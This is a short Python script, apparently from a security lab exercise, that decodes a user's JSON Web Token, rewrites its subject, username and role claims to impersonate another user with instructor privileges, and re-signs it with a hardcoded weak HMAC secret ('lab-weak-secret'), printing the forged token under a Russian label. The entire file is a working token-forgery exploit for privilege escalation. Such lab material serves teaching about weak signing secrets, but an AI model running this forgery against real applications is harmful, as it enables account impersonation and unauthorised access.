import base64

import hashlib

import hmac

import json


def b64(data):

    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


original = input("JWT Alice: ").strip()

head, body, old_sig = original.split(".")

padded = body + "=" * (-len(body) % 4)

claims = json.loads(base64.urlsafe_b64decode(padded))

claims["sub"] = "3"

claims["username"] = "carol"

claims["role"] = "instructor"

new_body = b64(json.dumps(claims).encode())

signed_data = head + "." + new_body

signature = hmac.new(

b"lab-weak-secret", signed_data.encode(), hashlib.sha256

).digest()

print("Изменённый JWT:")

print(signed_data + "." + b64(signature))